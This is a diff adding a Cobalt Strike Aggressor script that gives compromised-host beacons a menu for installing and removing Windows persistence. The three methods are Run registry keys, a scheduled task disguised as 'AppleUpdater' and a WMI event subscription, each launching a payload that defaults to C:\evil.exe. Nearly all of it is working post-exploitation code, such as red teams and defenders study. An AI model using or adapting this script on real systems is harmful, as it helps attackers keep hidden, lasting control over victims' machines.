@@ -1,0 +1,260 @@
+# Thanks to bluescreenofjeff for his awesome scripts that act as reference!
+##############################################################################################################################################################
+######################################################### Global Variables ###################################################################################
+##############################################################################################################################################################
+
+# Global Variables
+%globalsettings['RegHive'] = 'HKCU';
+%globalsettings['RegPath'] = '\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';
+%globalsettings['RegValue'] = 'RandomKeyDFIR';
+%globalsettings['PayloadPath'] = 'C:\\evil.exe';
+%globalsettings['Action'] = 'Add';
+%globalsettings['TaskName'] = 'AppleUpdater';
+%globalsettings['TaskTrigger'] = 'HOURLY';
+%globalsettings['TaskTime'] = '03:45:50';
+%globalsettings['WMIName'] = 'AppleUpdater';
+
+##############################################################################################################################################################
+################################################# Registry Persistence Section ###############################################################################
+##############################################################################################################################################################
+
+# Registry Persistence Section
+
+sub add_regkey {
+    # PowerShell command to run
+    $ppick_add = 'New-ItemProperty -Path "' . $2['RegHive'] . ":" . $2['RegPath'] . '" -Name "' . $2['RegValue'] . '" -PropertyType String -Value "' . $2['PayloadPath'] . '"';
+
+    if(-isadmin $1) {
+        binput($1, "Installing registry persistence");
+        bpowerpick($1, $ppick_add);
+    }
+    else {
+        $lc_hive = lc($2['RegHive']);
+        if ($lc_hive hasmatch "hklm") {
+            berror($1, "You can't write to HKLM without admin rights!");
+        }
+        else {
+            binput($1, "Installing registry persistence");
+            bpowerpick($1, $ppick_add);
+        }
+    }
+}
+
+sub remove_regkey {
+    $ppick_remove = 'Remove-ItemProperty -Path "' . $2['RegHive'] . ":" . $2['RegPath'] . '" -Name "' . $2['RegValue'] . '"';
+    if(-isadmin $1) {
+        binput($1, "Removing Registry Persistence");
+        bpowerpick($1, $ppick_remove);
+    }
+    else {
+        $lc_hive = lc($2['RegHive']);
+        if ($lc_hive hasmatch "hklm") {
+            berror($1, "You can't remove from HKLM without admin rights!");
+        }
+        else {
+            binput($1, "Removing registry persistence");
+            bpowerpick($1, $ppick_remove);
+        }
+    }
+}
+
+sub reg_method {
+    # Find the proper beacon ID to use
+    foreach $beacon (beacons()) {
+        if ($3['Target'] eq $beacon['pid']) {
+            $incoming_regmethod = lc($3['Action']);
+            if ($incoming_regmethod eq 'add') {
+                add_regkey($beacon['id'], $3);
+            }
+            else if ($incoming_regmethod eq 'remove') {
+                remove_regkey($beacon['id'], $3);
+            }
+            else {
+                berror($1, 'You did not provide a valid action to take! [Add] or [Remove]!');
+                println('hit error block');
+            }
+        }
+    }
+    clear($3);
+}
+
+sub reg_persistence {
+    # Get all process IDs of selected beacons
+    @total_proc_ids = @();
+    foreach $beacon (beacons()) {
+        add(@total_proc_ids, $beacon['pid']);
+    }
+
+    $dialogbox = dialog("Registry Persistence", %(RegHive => %globalsettings['RegHive'], RegPath => %globalsettings['RegPath'], RegValue => %globalsettings['RegValue'], PayloadPath => %globalsettings['PayloadPath'], Action => %globalsettings['Action'], Target => @total_proc_ids), &reg_method);
+    dialog_description($dialogbox, "Set or remove registry based persistence");
+
+    drow_text($dialogbox, "RegHive", "Registry Hive:");
+    drow_text($dialogbox, "RegPath", "Registry Path:");
+    drow_text($dialogbox, "RegValue", "Registry Value:");
+    drow_text($dialogbox, "PayloadPath", "Payload:");
+    drow_combobox($dialogbox, "Action", "Add or Remove:", @('Add', 'Remove'));
+    drow_combobox($dialogbox, "Target", "Targeted System (PID):", @total_proc_ids);
+    dbutton_action($dialogbox, "Launch");
+
+    dialog_show($dialogbox);
+    clear(@total_proc_ids);
+}
+
+##############################################################################################################################################################
+###################################################### Scheduled Task Section ################################################################################
+##############################################################################################################################################################
+
+# Scheduled task section
+
+sub add_task {
+    # PowerShell command to run
+    $shell_add = 'schtasks /create /tn "' . $2['TaskName'] . '" /tr "' . $2['Payload'] . '" /sc ' . $2['TaskTrigger'] . ' /st ' . $2['TaskTime'];
+    
+    # Create the task
+    binput($1, "Installing scheduled task persistence");
+    bpowerpick($1, $shell_add);
+}
+
+sub remove_task {
+    $shell_remove = 'schtasks /delete /tn "' . $2['TaskName'] . '" /F';
+    
+    # Delete the task
+    binput($1, "Removing scheduled task persistence");
+    bpowerpick($1, $shell_remove);
+}
+
+sub sch_task_persistence {
+    # Get all process IDs of selected beacons
+    @total_proc_ids = @();
+    foreach $beacon (beacons()) {
+        add(@total_proc_ids, $beacon['pid']);
+    }
+
+    $dialogbox = dialog("Scheduled Task Persistence", %(TaskName => %globalsettings['TaskName'], TaskTime => %globalsettings['TaskTime'], Payload => %globalsettings['PayloadPath'], TaskTrigger => %globalsettings['TaskTrigger'], Action => %globalsettings['Action'], Target => $1), &task_method);
+
+    drow_text($dialogbox, "TaskName", "Scheduled Task Name:");
+    drow_text($dialogbox, "TaskTime", "Scheduled Task Trigger Time:");
+    drow_text($dialogbox, "TaskTrigger", "Scheduled Task Trigger:");
+    drow_text($dialogbox, "Payload", "Payload:");
+    drow_combobox($dialogbox, "Action", "Add or Remove:", @('Add', 'Remove'));
+    drow_combobox($dialogbox, "Target", "Targeted System (PID):", @total_proc_ids);
+    dbutton_action($dialogbox, "Launch");
+
+    dialog_show($dialogbox);
+    clear(@total_proc_ids);
+}
+
+sub task_method {
+    # Find the proper beacon ID to use
+    foreach $beacon (beacons()) {
+        if ($3['Target'] eq $beacon['pid']) {
+            $incoming_taskmethod = lc($3['Action']);
+            if ($incoming_taskmethod eq 'add') {
+                add_task($beacon['id'], $3);
+            }
+            else if ($incoming_taskmethod eq 'remove') {
+                remove_task($beacon['id'], $3);
+            }
+            else {
+                berror($1, 'You did not provide a valid action to take! [Add] or [Remove]!');
+                println('hit error block');
+            }
+        }
+    }
+    clear($3);
+}
+
+##############################################################################################################################################################
+########################################################### WMI Based Persistence ############################################################################
+##############################################################################################################################################################
+
+# WMI based persistence
+
+sub add_wmi {
+    if(-isadmin $1) {
+         # PowerShell command to run
+        $wmi_add = "\$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='" . $2['WMIName'] . "';EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 201 AND TargetInstance.SystemUpTime < 323\"};\$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{Name='" . $2['WMIName'] . "';CommandLineTemplate ='" . $2['Payload'] . "'};Set-WmiInstance -Namespace \"root\\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=\$Filter;Consumer=\$Consumer};";
+
+        # Install WMI persistence
+        binput($1, "Installing wmi persistence");
+        bpowerpick($1, $wmi_add);
+    }
+    else {
+        berror($1, "You can't install WMI persistence without admin rights!");
+    }
+}
+
+sub remove_wmi {
+    if(-isadmin $1) {
+        $wmi_remove1 = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='" . $2['WMIName'] . "'\"| Remove-WmiObject";
+        $wmi_remove2 = "Get-WmiObject CommandLineEventConsumer -Namespace root\\subscription -filter \"name='" . $2['WMIName'] . "'\" | Remove-WmiObject";
+        $wmi_remove3 = "Get-WmiObject __FilterToConsumerBinding -Namespace root\\subscription | Where-Object { \$_.filter -match '" . $2['WMIName'] . "'} | Remove-WmiObject";
+        
+        # Delete wmi persistence
+        binput($1, "Removing wmi persistence");
+        bpowerpick($1, $wmi_remove1);
+        bpowerpick($1, $wmi_remove2);
+        bpowerpick($1, $wmi_remove3);
+    }
+    else {
+        berror($1, "You can't remove WMI persistence without admin rights!");
+    }
+    
+}
+
+sub wmi_persistence {
+     # Get all process IDs of selected beacons
+    @total_proc_ids = @();
+    foreach $beacon (beacons()) {
+        add(@total_proc_ids, $beacon['pid']);
+    }
+
+    $dialogbox = dialog("WMI Persistence", %(WMIName => %globalsettings['WMIName'], Payload => %globalsettings['PayloadPath'], Action => %globalsettings['Action'], Target => $1), &wmi_method);
+
+    drow_text($dialogbox, "WMIName", "WMI Name:");
+    drow_text($dialogbox, "Payload", "Payload:");
+    drow_combobox($dialogbox, "Action", "Add or Remove:", @('Add', 'Remove'));
+    drow_combobox($dialogbox, "Target", "Targeted System (PID):", @total_proc_ids);
+    dbutton_action($dialogbox, "Launch");
+
+    dialog_show($dialogbox);
+    clear(@total_proc_ids);
+}
+
+sub wmi_method {
+    # Find the proper beacon ID to use
+    foreach $beacon (beacons()) {
+        if ($3['Target'] eq $beacon['pid']) {
+            $incoming_taskmethod = lc($3['Action']);
+            if ($incoming_taskmethod eq 'add') {
+                add_wmi($beacon['id'], $3);
+            }
+            else if ($incoming_taskmethod eq 'remove') {
+                remove_wmi($beacon['id'], $3);
+            }
+            else {
+                berror($1, 'You did not provide a valid action to take! [Add] or [Remove]!');
+                println('hit error block');
+            }
+        }
+    }
+    clear($3);
+}
+
+##############################################################################################################################################################
+########################################################### Pop-Up Menu Section ##############################################################################
+##############################################################################################################################################################
+
+# Pop-up Menu Section
+
+popup beacon_bottom {
+    item "Registry Persistence" {
+        reg_persistence($1);
+    }
+    item "Scheduled Task Persistence" {
+        sch_task_persistence($1);
+    }
+    item "WMI Persistence" {
+        wmi_persistence($1);
+    }
+}
